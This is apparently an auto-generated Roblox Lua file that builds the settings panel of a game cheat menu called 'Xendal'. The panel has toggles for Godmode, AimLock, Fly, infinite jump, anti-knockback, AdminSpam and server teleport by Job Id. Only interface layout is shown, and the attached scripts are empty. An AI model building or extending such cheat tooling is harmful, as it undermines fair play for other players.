G2L["43"]["Size"] = UDim2.new(0.88932, 0, 0.8596, 0);
G2L["43"]["Position"] = UDim2.new(0.09554, 0, 0.05468, 0);
G2L["43"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["43"]["Text"] = [[]];
G2L["43"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.Tp Job Id
G2L["44"] = Instance.new("Frame", G2L["41"]);
G2L["44"]["ZIndex"] = 2;
G2L["44"]["BorderSizePixel"] = 0;
G2L["44"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["44"]["Size"] = UDim2.new(0.91137, 0, 0.96835, 0);
G2L["44"]["Position"] = UDim2.new(-0.97696, 0, 1.38253, 0);
G2L["44"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["44"]["Name"] = [[Tp Job Id]];
G2L["44"]["BackgroundTransparency"] = 0.8;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.Tp Job Id.UICorner
G2L["45"] = Instance.new("UICorner", G2L["44"]);
G2L["45"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.Tp Job Id.UIGradient
G2L["46"] = Instance.new("UIGradient", G2L["44"]);
G2L["46"]["Rotation"] = -90;
G2L["46"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.Tp Job Id.UIStroke
G2L["47"] = Instance.new("UIStroke", G2L["44"]);
G2L["47"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.Tp Job Id.Button
G2L["48"] = Instance.new("TextButton", G2L["44"]);
G2L["48"]["TextWrapped"] = true;
G2L["48"]["TextTransparency"] = 0.1;
G2L["48"]["TextSize"] = 14;
G2L["48"]["TextScaled"] = true;
G2L["48"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["48"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["48"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["48"]["BackgroundTransparency"] = 1;
G2L["48"]["Size"] = UDim2.new(0.72178, 0, 0.54494, 0);
G2L["48"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["48"]["Text"] = [[Tp Job Id]];
G2L["48"]["Name"] = [[Button]];
G2L["48"]["Position"] = UDim2.new(0.09888, 5, 0.21599, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.Tp Job Id.Button.LocalScript
G2L["49"] = Instance.new("LocalScript", G2L["48"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.Copy Id
G2L["4a"] = Instance.new("Frame", G2L["41"]);
G2L["4a"]["ZIndex"] = 2;
G2L["4a"]["BorderSizePixel"] = 0;
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["4a"]["Size"] = UDim2.new(0.90788, 0, 0.96835, 0);
G2L["4a"]["Position"] = UDim2.new(0.17886, 0, 1.38253, 0);
G2L["4a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["4a"]["Name"] = [[Copy Id]];
G2L["4a"]["BackgroundTransparency"] = 0.8;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.Copy Id.UICorner
G2L["4b"] = Instance.new("UICorner", G2L["4a"]);
G2L["4b"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.Copy Id.UIGradient
G2L["4c"] = Instance.new("UIGradient", G2L["4a"]);
G2L["4c"]["Rotation"] = -90;
G2L["4c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.Copy Id.UIStroke
G2L["4d"] = Instance.new("UIStroke", G2L["4a"]);
G2L["4d"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.Copy Id.Button
G2L["4e"] = Instance.new("TextButton", G2L["4a"]);
G2L["4e"]["TextWrapped"] = true;
G2L["4e"]["TextTransparency"] = 0.1;
G2L["4e"]["TextSize"] = 14;
G2L["4e"]["TextScaled"] = true;
G2L["4e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4e"]["BackgroundTransparency"] = 1;
G2L["4e"]["Size"] = UDim2.new(0.58697, 0, 0.57444, 0);
G2L["4e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["4e"]["Text"] = [[Copy my Id]];
G2L["4e"]["Name"] = [[Button]];
G2L["4e"]["Position"] = UDim2.new(0.14751, 5, 0.18648, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.Copy Id.Button.LocalScript
G2L["4f"] = Instance.new("LocalScript", G2L["4e"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.UICorner
G2L["50"] = Instance.new("UICorner", G2L["40"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.UIStroke
G2L["51"] = Instance.new("UIStroke", G2L["40"]);
G2L["51"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.TextLabel
G2L["52"] = Instance.new("TextLabel", G2L["40"]);
G2L["52"]["TextWrapped"] = true;
G2L["52"]["BorderSizePixel"] = 0;
G2L["52"]["TextSize"] = 24;
G2L["52"]["TextTransparency"] = 0.1;
G2L["52"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["52"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["BackgroundTransparency"] = 1;
G2L["52"]["Size"] = UDim2.new(0, 111, 0, 33);
G2L["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52"]["Text"] = [[Tp Job  id]];
G2L["52"]["Position"] = UDim2.new(0.06725, 0, 0.14325, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.TextLabel
G2L["53"] = Instance.new("TextLabel", G2L["40"]);
G2L["53"]["TextWrapped"] = true;
G2L["53"]["BorderSizePixel"] = 0;
G2L["53"]["TextSize"] = 1;
G2L["53"]["TextTransparency"] = 0.5;
G2L["53"]["TextScaled"] = true;
G2L["53"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["53"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["53"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["53"]["BackgroundTransparency"] = 1;
G2L["53"]["Size"] = UDim2.new(0, 32, 0, 39);
G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["53"]["Text"] = [[|]];
G2L["53"]["Position"] = UDim2.new(0.44836, 0, 0.05991, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.UIPadding
G2L["54"] = Instance.new("UIPadding", G2L["35"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJump
G2L["55"] = Instance.new("Frame", G2L["35"]);
G2L["55"]["BorderSizePixel"] = 0;
G2L["55"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["55"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["55"]["Position"] = UDim2.new(0.01, 15, 0.18217, -5);
G2L["55"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["55"]["Name"] = [[InfinityJump]];
G2L["55"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJump.UICorner
G2L["56"] = Instance.new("UICorner", G2L["55"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJump.TextLabel
G2L["57"] = Instance.new("TextLabel", G2L["55"]);
G2L["57"]["TextWrapped"] = true;
G2L["57"]["BorderSizePixel"] = 0;
G2L["57"]["TextSize"] = 14;
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["57"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["BackgroundTransparency"] = 1;
G2L["57"]["Size"] = UDim2.new(0, 48, 0, 16);
G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["Text"] = [[Anti-kb]];
G2L["57"]["Position"] = UDim2.new(0.087, 0, 0.251, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfinityJump.UIStroke
G2L["58"] = Instance.new("UIStroke", G2L["55"]);
G2L["58"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Noflymeduse
G2L["59"] = Instance.new("Frame", G2L["35"]);
G2L["59"]["BorderSizePixel"] = 0;
G2L["59"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["59"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["59"]["Position"] = UDim2.new(0.01, 15, 0.34742, -5);
G2L["59"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["59"]["Name"] = [[Noflymeduse]];
G2L["59"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Noflymeduse.UICorner
G2L["5a"] = Instance.new("UICorner", G2L["59"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Noflymeduse.TextLabel
G2L["5b"] = Instance.new("TextLabel", G2L["59"]);
G2L["5b"]["TextWrapped"] = true;
G2L["5b"]["BorderSizePixel"] = 0;
G2L["5b"]["TextSize"] = 14;
G2L["5b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["5b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5b"]["BackgroundTransparency"] = 1;
G2L["5b"]["Size"] = UDim2.new(0, 72, 0, 16);
G2L["5b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5b"]["Text"] = [[InstaGrab]];
G2L["5b"]["Position"] = UDim2.new(0.1, -9, 0.271, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Noflymeduse.UIStroke
G2L["5c"] = Instance.new("UIStroke", G2L["59"]);
G2L["5c"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle
G2L["5d"] = Instance.new("Frame", G2L["35"]);
G2L["5d"]["BorderSizePixel"] = 0;
G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["5d"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["5d"]["Position"] = UDim2.new(0.01, 15, 0.42842, -5);
G2L["5d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5d"]["Name"] = [[GodmodeToggle]];
G2L["5d"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.UICorner
G2L["5e"] = Instance.new("UICorner", G2L["5d"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.TextLabel
G2L["5f"] = Instance.new("TextLabel", G2L["5d"]);
G2L["5f"]["TextWrapped"] = true;
G2L["5f"]["BorderSizePixel"] = 0;
G2L["5f"]["TextSize"] = 14;
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["5f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5f"]["BackgroundTransparency"] = 1;
G2L["5f"]["Size"] = UDim2.new(0, 63, 0, 16);
G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["Text"] = [[Godmode]];
G2L["5f"]["Position"] = UDim2.new(0.1, -5, 0.243, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.GodmodeToggle.UIStroke
G2L["60"] = Instance.new("UIStroke", G2L["5d"]);
G2L["60"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJumpV2
G2L["61"] = Instance.new("Frame", G2L["35"]);
G2L["61"]["BorderSizePixel"] = 0;
G2L["61"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["61"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["61"]["Position"] = UDim2.new(0.01, 15, 0.508, -5);
G2L["61"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["61"]["Name"] = [[InfJumpV2]];
G2L["61"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJumpV2.UICorner
G2L["62"] = Instance.new("UICorner", G2L["61"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJumpV2.UIStroke
G2L["63"] = Instance.new("UIStroke", G2L["61"]);
G2L["63"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InfJumpV2.TextLabel
G2L["64"] = Instance.new("TextLabel", G2L["61"]);
G2L["64"]["TextWrapped"] = true;
G2L["64"]["BorderSizePixel"] = 0;
G2L["64"]["TextSize"] = 14;
G2L["64"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["64"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["BackgroundTransparency"] = 1;
G2L["64"]["Size"] = UDim2.new(0, 69, 0, 16);
G2L["64"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["64"]["Text"] = [[InfJumpV2]];
G2L["64"]["Position"] = UDim2.new(0.10225, -5, 0.243, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Aimlock
G2L["65"] = Instance.new("Frame", G2L["35"]);
G2L["65"]["BorderSizePixel"] = 0;
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["65"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["65"]["Position"] = UDim2.new(0.01, 15, 0.58941, -5);
G2L["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["Name"] = [[Aimlock]];
G2L["65"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Aimlock.UICorner
G2L["66"] = Instance.new("UICorner", G2L["65"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Aimlock.TextLabel
G2L["67"] = Instance.new("TextLabel", G2L["65"]);
G2L["67"]["TextWrapped"] = true;
G2L["67"]["BorderSizePixel"] = 0;
G2L["67"]["TextSize"] = 14;
G2L["67"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["67"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["BackgroundTransparency"] = 1;
G2L["67"]["Size"] = UDim2.new(0, 61, 0, 16);
G2L["67"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["Text"] = [[AimLock]];
G2L["67"]["Position"] = UDim2.new(0.08769, -5, 0.27, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Aimlock.UIStroke
G2L["68"] = Instance.new("UIStroke", G2L["65"]);
G2L["68"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpam
G2L["69"] = Instance.new("Frame", G2L["35"]);
G2L["69"]["BorderSizePixel"] = 0;
G2L["69"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["69"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["69"]["Position"] = UDim2.new(0.01, 15, 0.67157, -5);
G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["69"]["Name"] = [[AdminSpam]];
G2L["69"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpam.UICorner
G2L["6a"] = Instance.new("UICorner", G2L["69"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpam.TextLabel
G2L["6b"] = Instance.new("TextLabel", G2L["69"]);
G2L["6b"]["TextWrapped"] = true;
G2L["6b"]["BorderSizePixel"] = 0;
G2L["6b"]["TextSize"] = 14;
G2L["6b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["6b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6b"]["BackgroundTransparency"] = 1;
G2L["6b"]["Size"] = UDim2.new(0, 77, 0, 17);
G2L["6b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6b"]["Text"] = [[AdminSpam]];
G2L["6b"]["Position"] = UDim2.new(0.1, -5, 0.25, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.AdminSpam.UIStroke
G2L["6c"] = Instance.new("UIStroke", G2L["69"]);
G2L["6c"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrab
G2L["6d"] = Instance.new("Frame", G2L["35"]);
G2L["6d"]["BorderSizePixel"] = 0;
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["6d"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["6d"]["Position"] = UDim2.new(0.01, 15, 0.75248, -5);
G2L["6d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["Name"] = [[InstaGrab]];
G2L["6d"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrab.UICorner
G2L["6e"] = Instance.new("UICorner", G2L["6d"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrab.TextLabel
G2L["6f"] = Instance.new("TextLabel", G2L["6d"]);
G2L["6f"]["TextWrapped"] = true;
G2L["6f"]["BorderSizePixel"] = 0;
G2L["6f"]["TextSize"] = 14;
G2L["6f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["6f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6f"]["BackgroundTransparency"] = 1;
G2L["6f"]["Size"] = UDim2.new(0, 24, 0, 17);
G2L["6f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6f"]["Text"] = [[Fly]];
G2L["6f"]["Position"] = UDim2.new(0.1, -5, 0.24, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.InstaGrab.UIStroke
G2L["70"] = Instance.new("UIStroke", G2L["6d"]);
G2L["70"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Broken
G2L["71"] = Instance.new("Frame", G2L["35"]);
G2L["71"]["Visible"] = false;
G2L["71"]["BorderSizePixel"] = 0;
G2L["71"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["71"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["71"]["Position"] = UDim2.new(0.01, 15, 0.913, -5);
G2L["71"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["71"]["Name"] = [[Broken]];
G2L["71"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Broken.UICorner
G2L["72"] = Instance.new("UICorner", G2L["71"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Broken.TextLabel
G2L["73"] = Instance.new("TextLabel", G2L["71"]);
G2L["73"]["TextWrapped"] = true;
G2L["73"]["BorderSizePixel"] = 0;
G2L["73"]["TextSize"] = 14;
G2L["73"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["73"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["73"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["73"]["BackgroundTransparency"] = 1;
G2L["73"]["Size"] = UDim2.new(0, 49, 0, 17);
G2L["73"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["73"]["Text"] = [[Broken]];
G2L["73"]["Position"] = UDim2.new(0.1, -5, 0.21, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Broken.UIStroke
G2L["74"] = Instance.new("UIStroke", G2L["71"]);
G2L["74"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoost
G2L["75"] = Instance.new("Frame", G2L["35"]);
G2L["75"]["BorderSizePixel"] = 0;
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["75"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["75"]["Position"] = UDim2.new(0.01, 15, 0.1, -5);
G2L["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["Name"] = [[JumpBoost]];
G2L["75"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoost.UICorner
G2L["76"] = Instance.new("UICorner", G2L["75"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoost.TextLabel
G2L["77"] = Instance.new("TextLabel", G2L["75"]);
G2L["77"]["BorderSizePixel"] = 0;
G2L["77"]["TextSize"] = 14;
G2L["77"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["77"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["77"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["77"]["BackgroundTransparency"] = 1;
G2L["77"]["Size"] = UDim2.new(0, 55, 0, 16);
G2L["77"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["77"]["Text"] = [[Jump Boost+]];
G2L["77"]["Position"] = UDim2.new(0.133, 0, 0.253, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoost.UIStroke
G2L["78"] = Instance.new("UIStroke", G2L["75"]);
G2L["78"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimations
G2L["79"] = Instance.new("Frame", G2L["35"]);
G2L["79"]["BorderSizePixel"] = 0;
G2L["79"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["79"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["79"]["Position"] = UDim2.new(0.01, 15, 0.26618, -5);
G2L["79"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["79"]["Name"] = [[NoAnimations]];
G2L["79"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimations.UICorner
G2L["7a"] = Instance.new("UICorner", G2L["79"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimations.TextLabel
G2L["7b"] = Instance.new("TextLabel", G2L["79"]);
G2L["7b"]["TextWrapped"] = true;
G2L["7b"]["BorderSizePixel"] = 0;
G2L["7b"]["TextSize"] = 14;
G2L["7b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["7b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7b"]["BackgroundTransparency"] = 1;
G2L["7b"]["Size"] = UDim2.new(0, 71, 0, 16);
G2L["7b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7b"]["Text"] = [[AntiRadgoll]];
G2L["7b"]["Position"] = UDim2.new(0.1, -5, 0.243, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.NoAnimations.UIStroke
G2L["7c"] = Instance.new("UIStroke", G2L["79"]);
G2L["7c"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Cloner
G2L["7d"] = Instance.new("Frame", G2L["35"]);
G2L["7d"]["Visible"] = false;
G2L["7d"]["BorderSizePixel"] = 0;
G2L["7d"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["7d"]["Size"] = UDim2.new(0, 325, 0, 36);
G2L["7d"]["Position"] = UDim2.new(0.01, 15, 0.83137, -5);
G2L["7d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7d"]["Name"] = [[Cloner]];
G2L["7d"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Cloner.UICorner
G2L["7e"] = Instance.new("UICorner", G2L["7d"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Cloner.TextLabel
G2L["7f"] = Instance.new("TextLabel", G2L["7d"]);
G2L["7f"]["TextWrapped"] = true;
G2L["7f"]["BorderSizePixel"] = 0;
G2L["7f"]["TextSize"] = 14;
G2L["7f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["7f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7f"]["BackgroundTransparency"] = 1;
G2L["7f"]["Size"] = UDim2.new(0, 42, 0, 17);
G2L["7f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7f"]["Text"] = [[Cloner]];
G2L["7f"]["Position"] = UDim2.new(0.1, -5, 0.23999, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Cloner.UIStroke
G2L["80"] = Instance.new("UIStroke", G2L["7d"]);
G2L["80"]["Color"] = Color3.fromRGB(40, 40, 40);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoostToggle
G2L["81"] = Instance.new("Frame", G2L["35"]);
G2L["81"]["BorderSizePixel"] = 0;
G2L["81"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["81"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["81"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["81"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["81"]["Name"] = [[JumpBoostToggle]];
G2L["81"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.JumpBoostToggle.Main Handler
G2L["82"] = Instance.new("LocalScript", G2L["81"]);
G2L["82"]["Name"] = [[Main Handler]];


